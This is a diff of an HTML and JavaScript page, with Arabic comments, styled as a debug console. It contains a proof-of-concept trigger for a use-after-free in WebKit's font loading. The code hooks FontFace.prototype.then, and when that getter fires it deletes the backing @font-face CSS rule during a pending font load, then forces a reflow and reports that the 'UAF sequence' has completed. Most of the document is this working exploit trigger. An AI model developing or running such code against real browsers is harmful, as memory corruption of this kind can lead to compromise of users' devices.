@@ -2,58 +2,72 @@
 <html>
 <head>
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
-        #console { width: 100%; height: 85vh; border: 1px solid #333; overflow-y: scroll; padding: 10px; background: #0a0a0a; }
-        .entry { border-bottom: 1px solid #111; padding: 2px 0; }
+        /* ستايل كونسول احترافي يشبه شاشة النظام */
+        body { background: #000; color: #00FF00; font-family: 'Courier New', monospace; padding: 10px; margin: 0; }
+        #log-area { width: 100%; height: 95vh; overflow-y: scroll; font-size: 13px; line-height: 1.4; }
+        .line { border-bottom: 1px solid #111; margin-bottom: 3px; }
+        .timestamp { color: #555; margin-right: 10px; }
     </style>
 </head>
 <body>
-    <div id="console"></div>
+    <div id="log-area"></div>
 
-    <style id="s">@font-face { font-family: 'x'; src: url('null'); }</style>
+    <style id="s">
+        @font-face { font-family: 'x'; src: local('Arial'); unicode-range: U+0042; }
+    </style>
 
     <script>
-        const logBox = document.getElementById('console');
+        const logArea = document.getElementById('log-area');
+        
         function debug(msg) {
-            const time = new Date().getTime() % 10000;
-            logBox.innerHTML += `<div class="entry">[${time}ms] ${msg}</div>`;
-            logBox.scrollTop = logBox.scrollHeight;
+            const time = new Date().toLocaleTimeString();
+            logArea.innerHTML += `<div class="line"><span class="timestamp">[${time}]</span> ${msg}</div>`;
+            logArea.scrollTop = logArea.scrollHeight;
         }
 
-        window.onerror = (msg, url, line) => debug(`[CRITICAL] ${msg} at line ${line}`);
+        debug("System Started: Debugging WebKit Memory...");
 
-        debug("System Started. Injecting Hooks...");
-
-        (async () => {
-            debug("Heap Mapping: Initializing...");
-            let A = new FontFace('x', 'local(Arial)', { unicodeRange: 'U+0041' });
+        window.onload = () => {
+            debug("Initialising FontFace object...");
+            
+            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
             document.fonts.add(A);
+            void A.loaded;
 
+            debug("Hooking FontFace.prototype.then...");
+            
+            let fired = false;
             Object.defineProperty(FontFace.prototype, 'then', {
+                configurable: true,
                 get() {
-                    debug("TRAP: then() accessed. Corruption Sequence Starting...");
-                    // محاولة الوصول للذاكرة مباشرة بعد الحذف
-                    document.getElementById('s').sheet.deleteRule(0);
-                    
-                    // استخراج حالة الذاكرة (Memory SnapShot)
-                    if(window.performance && performance.memory) {
-                        debug(`DEBUG: UsedHeap: ${performance.memory.usedJSHeapSize / 1024 / 1024}MB`);
+                    if (!fired && this === A) {
+                        fired = true;
+                        debug("!!! TRAP HIT: then() accessed !!!");
+                        
+                        try {
+                            debug("Executing CSS Rule deletion...");
+                            document.getElementById('s').sheet.deleteRule(0);
+                            
+                            debug("Triggering Layout Reflow...");
+                            document.body.offsetTop;
+                            
+                            debug("UAF sequence completed.");
+                        } catch(e) {
+                            debug("Error in trap: " + e.message);
+                        }
                     }
-                    
                     return undefined;
                 }
             });
 
-            debug("Executing Font load trigger...");
+            debug("Starting Font load...");
             try {
-                // إزالة الشبكة تماماً باستخدام 'local'
-                await document.fonts.load('1em x', 'AB');
-                debug("Result: Load Finished.");
+                document.fonts.load('1em x', 'AB');
+                debug("Load call returned.");
             } catch (e) {
-                debug(`Result: Exception Caught: ${e.name} - ${e.message}`);
-                debug("ANALYSIS: Memory state locked. Analyzing heap corruption...");
+                debug("Exception caught: " + e.message);
             }
-        })();
+        };
     </script>
 </body>
 </html>
